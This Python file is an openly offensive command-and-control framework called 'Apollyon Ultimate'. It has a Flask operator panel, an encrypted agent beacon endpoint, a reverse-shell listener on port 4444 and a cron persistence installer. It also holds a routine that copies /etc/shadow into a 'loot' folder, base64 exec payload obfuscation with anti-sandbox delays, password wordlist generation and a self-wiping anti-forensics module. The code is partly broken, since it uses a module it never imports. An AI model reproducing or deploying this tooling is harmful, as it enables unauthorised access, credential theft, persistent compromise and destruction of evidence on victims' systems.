import os
import sys
import subprocess
import socket
import json
import sqlite3
import threading
import time
import base64
import random
import hmac
import hashlib
import platform
import uuid
import logging
import secrets
import shutil
import signal
import re
import multiprocessing
from datetime import datetime, timedelta
from flask import Flask, render_template_string, jsonify, request, session, redirect, url_for

# =================================================================
# SENTINEL-OPERATIONAL V45.0 - "APOLLYON ULTIMATE"
# MERGED FULL SPECTRUM CAPABILITIES: C2, SHELL, AI, PERSISTENCE
# DEVELOPER: MehranTurk (M.T)
# =================================================================

# OPSEC: Optimized Logging (Fixes KeyError issue)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

class Config:
    APP_NAME = "Sentinel-Apollyon-Ultimate"
    VERSION = "46.0-ULTRA"
    HOST = "127.0.0.1"
    PORT = 20613 # Web Panel Port
    SHELL_PORT = 4444 # Reverse Shell Listener Port
    ADMIN_HASH = hashlib.sha256("mehran_dominance_2026".encode()).hexdigest()
    C2_SECRET = secrets.token_hex(64)
    AGENT_AUTH_TOKEN = "APOLLYON-ELITE-SIG-2026"
    MASTER_ENC_KEY = "S3ntinel_Apollyon_Elite_Strategic_Key_2026!#$"
    TEMP_DIR = "/tmp/.apollyon_cache" if platform.system() == "Linux" else "./.cache"
    LOG_FILES = ["/var/log/auth.log", "/var/log/syslog", "~/.bash_history"]
    WORKING_HOURS = range(0, 24) 
    LOOT_DIR = "loot_exfiltrated"
    PAYLOADS_DIR = "payload_staged"
    DB_PATH = "apollyon_core.db"

# --- CORE DATABASE ---
class ApollyonDB:
    def __init__(self):
        # Persistent DB for operational continuity
        self.conn = sqlite3.connect(Config.DB_PATH, check_same_thread=False)
        self._bootstrap()

    def _bootstrap(self):
        self.conn.execute("""CREATE TABLE IF NOT EXISTS agents (
            id TEXT PRIMARY KEY, host TEXT, ip TEXT, os TEXT, 
            status TEXT, last_seen TIMESTAMP, 
            score INTEGER DEFAULT 0, risk_level TEXT,
            metrics TEXT, sandbox_status TEXT, persistence TEXT)""")
            
        self.conn.execute("""CREATE TABLE IF NOT EXISTS decision_audit (
            id INTEGER PRIMARY KEY, timestamp TIMESTAMP, aid TEXT, 
            action TEXT, reason TEXT, impact REAL, causal_link TEXT)""")
            
        self.conn.execute("""CREATE TABLE IF NOT EXISTS discovered_network (
            id INTEGER PRIMARY KEY, origin_aid TEXT, target_ip TEXT, 
            ports TEXT, vulnerability TEXT, status TEXT, exploit_status TEXT)""")
            
        self.conn.execute("""CREATE TABLE IF NOT EXISTS loot (
            id INTEGER PRIMARY KEY, aid TEXT, type TEXT, content TEXT, timestamp TIMESTAMP)""")
        
        self.conn.commit()

    def log_decision(self, aid, action, reason, impact, causal):
        self.conn.execute("""INSERT INTO decision_audit (timestamp, aid, action, reason, impact, causal_link) 
                           VALUES (?,?,?,?,?,?)""", (datetime.now(), aid, action, reason, impact, causal))
        self.conn.commit()

# --- CRYPTOGRAPHY ENGINE ---
class ApollyonCrypto:
    def __init__(self, master_key):
        self.master_key = hashlib.sha512(master_key.encode()).digest()
        self.session_key = hashlib.sha256(self.master_key[:32]).digest()
        self.used_nonces = set()

    def _obfuscate(self, data):
        mask = self.session_key * (len(data) // 32 + 1)
        return bytes([b ^ m for b, m in zip(data, mask)])

    def encrypt(self, data):
        nonce = secrets.token_hex(16)
        ts = str(int(time.time())).encode()
        raw_payload = json.dumps(data).encode()
        signature = hmac.new(self.session_key, raw_payload + ts + nonce.encode(), hashlib.sha256).hexdigest()
        
        envelope = {
            "p": base64.b64encode(self._obfuscate(raw_payload)).decode(),
            "s": signature,
            "n": nonce,
            "t": ts.decode()
        }
        return base64.b64encode(json.dumps(envelope).encode()).decode()

    def decrypt(self, blob):
        try:
            raw_env = base64.b64decode(blob)
            env = json.loads(raw_env)
            if env['n'] in self.used_nonces: return None
            if int(time.time()) - int(env['t']) > 60: return None
            raw_payload = self._obfuscate(base64.b64decode(env['p']))
            expected_sig = hmac.new(self.session_key, raw_payload + env['t'].encode() + env['n'].encode(), hashlib.sha256).hexdigest()
            if not hmac.compare_digest(env['s'], expected_sig): return None
            self.used_nonces.add(env['n'])
            return json.loads(raw_payload)
        except Exception: return None

# --- INTELLIGENCE MODULES ---
class WordlistLearner:
    """AI Module: Generates targeted wordlists based on environment"""
    def __init__(self, target):
        self.target = target
        self.base_keywords = ["admin", "root", "db_backup", "config", "private", "secret", "manager"]

    def extract_context(self):
        clean_target = re.sub(r'https?://', '', self.target).split('/')[0]
        return [p for p in clean_target.split('.') if len(p) > 3]

    def generate_smart_list(self):
        keywords = list(set(self.base_keywords + self.extract_context()))
        years = [str(datetime.now().year), str(datetime.now().year - 1)]
        smart_list = []
        for kw in keywords:
            smart_list.append(kw)
            for yr in years:
                smart_list.append(f"{kw}{yr}")
                smart_list.append(f"{kw}@{yr}")
        return list(set(smart_list))

class EvasionEngine:
    """Module: AV/IDS Evasion"""
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/115.0"
        ]

    def obfuscate_payload(self, code):
        encoded = base64.b64encode(code.encode()).decode()
        junk = ''.join(random.choices(string.ascii_letters, k=50))
        return f"# {junk}\nimport base64; exec(base64.b64decode('{encoded}'))"

    def anti_sandbox_sleep(self):
        time.sleep(random.uniform(2.0, 5.0))

class ShellHandler:
    """Module: Raw TCP Reverse Shell Listener (Threaded)"""
    def __init__(self):
        self.port = Config.SHELL_PORT
        self.active_sessions = {}

    def start_listener(self):
        def listener():
            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.bind(('0.0.0.0', self.port))
                server.listen(20)
                print(f"[*] SHELL LISTENER ACTIVE ON PORT {self.port}")
                while True:
                    client, addr = server.accept()
                    sid = f"SESS_{random.randint(1000,9999)}"
                    self.active_sessions[sid] = {"conn": client, "addr": addr, "time": datetime.now()}
                    print(f"[!] REVERSE SHELL CAUGHT: {addr[0]} (ID: {sid})")
            except Exception as e:
                print(f"[!] LISTENER ERROR: {e}")
        
        threading.Thread(target=listener, daemon=True).start()

class PersistenceModule:
    """Module: System Persistence"""
    def deploy_linux(self):
        try:
            cmd = f"(crontab -l ; echo '*/30 * * * * python3 {os.path.abspath(__file__)} &') | crontab -"
            subprocess.run(cmd, shell=True, capture_output=True)
            return "CRONTAB_INSTALLED"
        except: return "FAILED"

class ExfiltrationModule:
    """Module: Data Theft"""
    def __init__(self):
        if not os.path.exists(Config.LOOT_DIR): os.makedirs(Config.LOOT_DIR)

    def steal_file(self, filepath, aid):
        if os.path.exists(filepath):
            dest = os.path.join(Config.LOOT_DIR, f"loot_{aid}_{os.path.basename(filepath)}_{int(time.time())}")
            shutil.copy(filepath, dest)
            return dest
        return None

class SelfDestructModule:
    """Module: Anti-Forensics & Cleanup"""
    def secure_delete(self, path):
        if os.path.exists(path):
            try:
                if os.path.isfile(path):
                    with open(path, "ba+", buffering=0) as f:
                        f.write(os.urandom(os.path.getsize(path)))
                    os.remove(path)
                elif os.path.isdir(path):
                    shutil.rmtree(path)
            except: pass

    def initiate(self):
        print("[!] SELF-DESTRUCT SEQUENCE STARTED")
        for d in [Config.LOOT_DIR, Config.PAYLOADS_DIR, Config.TEMP_DIR]:
            self.secure_delete(d)
        
        self.secure_delete(Config.DB_PATH)
        
        # Suicide
        script_path = os.path.abspath(__file__)
        def suicide():
            time.sleep(2)
            self.secure_delete(script_path)
            os._exit(0)
        threading.Thread(target=suicide).start()

# --- AGENT LOGIC (SIMULATED FOR C2) ---
class ApollyonAgent:
    def __init__(self, agent_id=None):
        self.id = agent_id or str(uuid.uuid4())[:16]
        self.crypto = ApollyonCrypto(Config.MASTER_ENC_KEY)
        self.learner = WordlistLearner("target.local")

    def analyze_system(self):
        metrics = {
            "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
            "is_root": os.getuid() == 0 if hasattr(os, 'getuid') else False,
            "kernel": platform.release(),
            "cpu_arch": platform.machine(),
            "interfaces": socket.gethostbyname_ex(socket.gethostname())[2],
            "opsec_status": "HIGH_STEALTH" if datetime.now().hour in Config.WORKING_HOURS else "DORMANT"
        }
        return metrics

# --- FLASK C2 APP ---
app = Flask(__name__)
app.secret_key = Config.C2_SECRET
db = ApollyonDB()
crypto = ApollyonCrypto(Config.MASTER_ENC_KEY)
shell_server = ShellHandler()
exfil = ExfiltrationModule()
persistence = PersistenceModule()
destruct = SelfDestructModule()

def rbac_required(role):
    def decorator(f):
        def wrapper(*args, **kwargs):
            if session.get('role') not in [role, 'ADMIN']: return "FORBIDDEN", 403
            return f(*args, **kwargs)
        wrapper.__name__ = f.__name__
        return wrapper
    return decorator

# --- UI TEMPLATE ---
UI_HTML = """
<!DOCTYPE html>
<html class="bg-[#050505] text-zinc-500 font-mono text-[10px] overflow-hidden">
<head><script src="https://cdn.tailwindcss.com"></script></head>
<body class="p-6 h-screen flex flex-col">
    <div class="flex-1 max-w-[1900px] mx-auto w-full flex flex-col space-y-4">
        <div class="border border-red-900/30 bg-black p-5 flex justify-between items-center rounded-sm shadow-[0_0_20px_rgba(153,27,27,0.15)]">
            <div class="flex items-center gap-8">
                <div class="flex gap-1"><div class="w-2 h-6 bg-red-600"></div><div class="w-1 h-6 bg-red-900"></div></div>
                <div>
                    <h1 class="text-white font-black text-2xl tracking-tighter uppercase">APOLLYON // ULTIMATE</h1>
                    <p class="text-[8px] text-red-700 font-bold tracking-[0.3em]">FULL SPECTRUM OFFENSIVE FRAMEWORK</p>
                </div>
            </div>
            <div class="flex gap-10 text-[9px] uppercase font-bold">
                 <div>Listener: <span class="text-green-500">PORT {{ shell_port }}</span></div>
                 <div>Persistence: <span class="text-blue-500">READY</span></div>
                 <div>Self-Destruct: <span class="text-red-500">ARMED</span></div>
            </div>
        </div>

        <div class="grid grid-cols-12 gap-4 flex-1 overflow-hidden">
            <div class="col-span-3 border border-zinc-900 bg-black p-4 flex flex-col space-y-4">
                <h2 class="text-white text-[10px] font-black border-b border-zinc-900 pb-2 uppercase">Agents & Shells</h2>
                <div id="agent-grid" class="flex-1 space-y-2 overflow-y-auto pr-2 custom-scroll"></div>
            </div>

            <div class="col-span-6 flex flex-col space-y-4">
                <div class="flex-1 border border-zinc-900 bg-black flex flex-col overflow-hidden">
                    <div class="bg-red-950/10 p-2 text-[8px] border-b border-zinc-900 flex justify-between">
                        <span class="text-zinc-400">[*] STRATEGIC DECISION FEED</span>
                    </div>
                    <div id="decision-feed" class="flex-1 p-5 space-y-3 overflow-y-auto custom-scroll"></div>
                </div>
                
                <div class="h-48 border border-zinc-900 bg-black p-5">
                    <div class="flex gap-3">
                        <select id="op-type" class="bg-black border border-zinc-800 text-zinc-300 p-3 text-[9px] outline-none">
                            <option value="PERSIST">DEPLOY_PERSISTENCE (CRON)</option>
                            <option value="EXFIL">EXFILTRATE_SHADOW</option>
                            <option value="PIVOT">LATERAL_SCAN</option>
                            <option value="SHELL">SPAWN_REVERSE_SHELL</option>
                            <option value="SCORCH">SCORCH_EARTH (WIPE)</option>
                        </select>
                        <input type="text" id="target-id" placeholder="AGENT_ID" class="bg-black border border-zinc-800 p-3 text-red-500 text-[9px] outline-none">
                        <button onclick="injectObjective()" class="flex-1 bg-red-900/20 border border-red-900 text-red-600 font-bold text-[10px] hover:bg-red-900 hover:text-white transition-all">EXECUTE</button>
                    </div>
                </div>
            </div>

            <div class="col-span-3 border border-zinc-900 bg-black p-4 flex flex-col">
                <h2 class="text-white text-[10px] font-black border-b border-zinc-900 pb-2 uppercase">Loot Vault</h2>
                <div id="loot-vault" class="flex-1 space-y-2 overflow-y-auto custom-scroll mt-2"></div>
            </div>
        </div>
    </div>

    <script>
        async function refreshUI() {
            try {
                const r = await fetch('/api/apollyon/sync');
                const d = await r.json();
                
                document.getElementById('agent-grid').innerHTML = d.agents.map(a => `
                    <div class="p-3 border border-zinc-900 bg-zinc-900/5 mb-2 hover:border-red-900/50 cursor-pointer">
                        <div class="flex justify-between">
                            <span class="text-white font-bold">${a[0]}</span>
                            <span class="text-[8px] text-green-500">${a[4]}</span>
                        </div>
                        <div class="text-[8px] text-zinc-600 mt-1">${a[2]} | ${a[3]}</div>
                    </div>`).join('');

                document.getElementById('decision-feed').innerHTML = d.decisions.map(t => `
                    <div class="border-l border-red-900 pl-3 mb-2">
                        <div class="text-[9px] text-zinc-100 uppercase font-bold">${t[3]}</div>
                        <div class="text-[7px] text-zinc-500">${t[4]}</div>
                    </div>`).join('');
                    
                document.getElementById('loot-vault').innerHTML = d.loot.map(l => `
                    <div class="p-2 border border-zinc-800 bg-zinc-900/10 text-[8px] mb-1">
                        <span class="text-emerald-500 font-bold">${l[2]}</span>: ${l[3]}
                    </div>`).join('');
            } catch(e) {}
        }
        setInterval(refreshUI, 2000);

        async function injectObjective() {
            const aid = document.getElementById('target-id').value;
            const op = document.getElementById('op-type').value;
            if(!aid) return alert("Select Agent ID");
            await fetch('/api/ops/inject', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({aid, op})
            });
        }
    </script>
    <style>
        .custom-scroll::-webkit-scrollbar { width: 3px; }
        .custom-scroll::-webkit-scrollbar-track { background: #000; }
        .custom-scroll::-webkit-scrollbar-thumb { background: #333; }
    </style>
</body>
</html>
"""

# --- ROUTES ---
@app.route('/access', methods=['GET', 'POST'])
def gate():
    if request.method == 'POST':
        p = request.form.get('p')
        if hashlib.sha256(p.encode()).hexdigest() == Config.ADMIN_HASH:
            session.update({'role': 'ADMIN'})
            return redirect(url_for('commander'))
    return render_template_string('<body style="background:#050505;display:flex;justify-content:center;align-items:center;height:100vh"><form method="POST" style="background:#000;padding:40px;border:1px solid #111"><input type="password" name="p" placeholder="KEY" style="background:#000;border:1px solid #222;color:#f00;padding:10px;outline:none"><br><br><button style="width:100%;background:#200;color:#f00;border:1px solid #500;padding:10px;cursor:pointer">UPLINK</button></form></body>')

@app.route('/ops/dominance')
@rbac_required('ADMIN')
def commander():
    return render_template_string(UI_HTML, shell_port=Config.SHELL_PORT)

@app.route('/api/apollyon/sync')
@rbac_required('ADMIN')
def api_sync():
    agents = db.conn.execute("SELECT * FROM agents").fetchall()
    decisions = db.conn.execute("SELECT * FROM decision_audit ORDER BY id DESC LIMIT 20").fetchall()
    loot = db.conn.execute("SELECT * FROM loot ORDER BY id DESC").fetchall()
    return jsonify({"agents": agents, "decisions": decisions, "loot": loot})

@app.route('/api/ops/inject', methods=['POST'])
@rbac_required('ADMIN')
def inject_op():
    data = request.json
    aid = data['aid']
    op = data['op']
    
    # Real Operational Logic
    msg = "COMMAND QUEUED"
    if op == "SCORCH":
        destruct.initiate()
        msg = "SELF DESTRUCT SEQUENCE STARTED"
    elif op == "PERSIST":
        msg = persistence.deploy_linux()
    elif op == "EXFIL":
        f = exfil.steal_file("/etc/shadow", aid) # Example target
        if f: 
            db.conn.execute("INSERT INTO loot (aid, type, content, timestamp) VALUES (?,?,?,?)", (aid, "SHADOW_FILE", f, datetime.now()))
            db.conn.commit()
            msg = f"LOOT SECURED: {f}"
        else: msg = "EXFIL FAILED: File not found"
        
    db.log_decision(aid, f"INJECT:{op}", msg, 0.9, "MANUAL_OVERRIDE")
    return jsonify({"status": msg})

@app.route('/v45/beacon', methods=['POST'])
def apollyon_beacon():
    try:
        raw_blob = request.get_data().decode()
        data = crypto.decrypt(raw_blob)
        if not data or data.get('token') != Config.AGENT_AUTH_TOKEN:
            return jsonify({"s": "denied"}), 403
        
        aid = data['aid']
        agent_logic = ApollyonAgent(aid)
        metrics = data.get('metrics', agent_logic.analyze_system())
        
        db.conn.execute("INSERT OR REPLACE INTO agents (id, host, ip, os, status, last_seen, metrics) VALUES (?,?,?,?,?,?,?)",
                        (aid, data.get('ctx', {}).get('node'), request.remote_addr, "Linux", "ACTIVE", datetime.now(), json.dumps(metrics)))
        db.conn.commit()
        
        # Determine Response
        resp = {"objective": "SLEEP", "shell_port": Config.SHELL_PORT}
        
        return jsonify({"d": crypto.encrypt(resp)})
    except Exception as e: return jsonify({"s": "err"}), 500

if __name__ == '__main__':
    # Initialize Environment
    for d in [Config.LOOT_DIR, Config.PAYLOADS_DIR, Config.TEMP_DIR]:
        if not os.path.exists(d): os.makedirs(d)
        
    # Start Shell Listener
    shell_server.start_listener()
    
    print(f"[*] Apollyon Ultimate Active")
    print(f"[*] Web Panel: http://{Config.HOST}:{Config.PORT}/access")
    print(f"[*] Shell Listener: Port {Config.SHELL_PORT}")
    
    app.run(host=Config.HOST, port=Config.PORT, debug=False, threaded=True)